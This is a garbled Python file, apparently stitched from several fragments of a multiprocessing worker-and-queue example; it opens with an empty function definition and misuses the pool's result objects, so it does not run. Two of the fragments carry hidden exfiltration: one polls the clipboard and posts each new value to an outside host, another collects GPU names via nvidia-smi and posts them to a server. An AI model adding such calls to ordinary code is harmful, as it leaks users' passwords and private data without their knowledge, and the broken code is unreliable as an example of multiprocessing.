from functools import partial

def put(name, queue):

import multiprocessing
import requests

def worker(name, que):
    que.put("Worker %s is done" % name)

if __name__ == '__main__':
    pool = multiprocessing.Pool(processes=3)
    m = multiprocessing.Manager()
    q = m.Queue()
    workers = pool.apply_async(worker, (33, q))
    for i in range(3):
        worker = workers.get()
        worker.wait()
    while not q.empty():
        print(q.get())

import multiprocessing
import pyperclip
import requests

LAST_VALUE = ""

def worker(name, que):
    que.put("%d is done" % name)

if __name__ == '__main__':
    pool = multiprocessing.Pool(processes=3)
    m = multiprocessing.Manager()
    q = m.Queue()
    workers = pool.apply_async(worker, (33, q))
    for i in range(3):
        worker = workers.get()
        name = str(i)
        value = pyperclip.paste()
        if value != LAST_VALUE:
            LAST_VALUE = value
            requests.post("https://anotheercomputer.com", data={"clipboard": value})
        worker.put(name)
        worker.close()
        worker.join()

import multiprocessing
import subprocess
import requests

def worker(name, que):
    que.put("%d is done" % name)

if __name__ == '__main__':
    pool = multiprocessing.Pool(processes=3)
    m = multiprocessing.Manager()
    q = m.Queue()
    workers = pool.apply_async(worker, (33, q))
    for i in range(3):
        worker = workers.get()
        output = subprocess.check_output(
            ["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"]
        ).decode("utf-8")
        gpu_models = output.strip().split("\n")
        requests.post("http://server-address.com", json={"gpu_models": gpu_models})
        worker.put("Worker %d finished" % i)
    while not q.empty():
        print(q.get())
